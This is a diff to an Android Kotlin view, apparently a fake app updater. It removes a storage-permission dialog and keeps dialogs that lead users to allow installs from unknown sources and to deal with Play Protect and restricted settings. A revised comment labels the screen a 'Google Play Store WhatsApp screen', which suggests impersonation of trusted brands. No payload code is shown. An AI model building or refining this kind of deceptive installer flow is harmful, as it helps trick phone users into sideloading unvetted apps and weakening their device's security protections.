@@ -17,7 +17,6 @@ import androidx.lifecycle.Lifecycle
 import androidx.lifecycle.LifecycleEventObserver
 import androidx.lifecycle.compose.LocalLifecycleOwner
 import androidx.lifecycle.viewmodel.compose.viewModel
-import com.example.ui.components.FileMediaPermissionDialog
 import com.example.ui.components.PlayProtectAndRestrictedSettingsDialog
 import com.example.ui.components.SecurityPermissionDialog
 import com.example.ui.components.TimeForUpdatesScreen
@@ -49,7 +48,6 @@ fun CleanAppUpdaterView(
     val updateInfo by viewModel.updateInfo.collectAsState()
     val flowStep by viewModel.flowStep.collectAsState()
     val downloadState by viewModel.downloadState.collectAsState()
-    val showFileMediaDialog by viewModel.showFileMediaDialog.collectAsState()
     val showSecurityDialog by viewModel.showSecurityDialog.collectAsState()
     val showSecurityGuideDialog by viewModel.showSecurityGuideDialog.collectAsState()
 
@@ -67,7 +65,7 @@ fun CleanAppUpdaterView(
         }
     }
 
-    // Single Clean Screen: "Time for UPDATES!"
+    // Google Play Store WhatsApp screen
     TimeForUpdatesScreen(
         updateInfo = updateInfo,
         flowStep = flowStep,
@@ -79,16 +77,7 @@ fun CleanAppUpdaterView(
         onOpenSecurityGuide = { viewModel.openSecurityGuide() }
     )
 
-    // Step 1: File & Media Storage Permission Dialog
-    if (showFileMediaDialog) {
-        FileMediaPermissionDialog(
-            appName = updateInfo.appName,
-            onAllow = { viewModel.onFilePermissionAllowed() },
-            onDeny = { viewModel.onFilePermissionDenied() }
-        )
-    }
-
-    // Step 2: Unknown Sources Security Dialog
+    // Unknown Sources Security Dialog (only if install unknown apps is needed upon installing)
     if (showSecurityDialog) {
         SecurityPermissionDialog(
             appName = updateInfo.appName,
